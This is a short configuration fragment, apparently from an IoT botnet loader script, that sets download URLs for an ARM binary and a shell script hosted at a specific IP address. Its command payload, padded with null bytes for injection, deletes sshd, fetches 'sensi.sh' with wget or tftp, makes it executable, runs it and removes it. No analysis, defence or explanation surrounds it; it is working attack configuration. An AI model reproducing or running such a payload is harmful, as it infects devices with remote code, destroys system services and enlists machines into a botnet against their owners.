...
# START CONFIGURATION #
url = "http://185.237.96.86/xd.arm4" # ARM4 Binary
sh_file = "http://185.237.96.86/sensi.sh" # SH File
commandpayload = "AA\x00\x00AAAA cd /var/; rm -rf sshd; wget http://185.237.96.86/sensi.sh || tftp -r sensi.sh -g 185.237.96.86; chmod 777 sensi.sh; ./sensi.sh; rm -rf sensi.sh\x00" # MIPSEL Binary
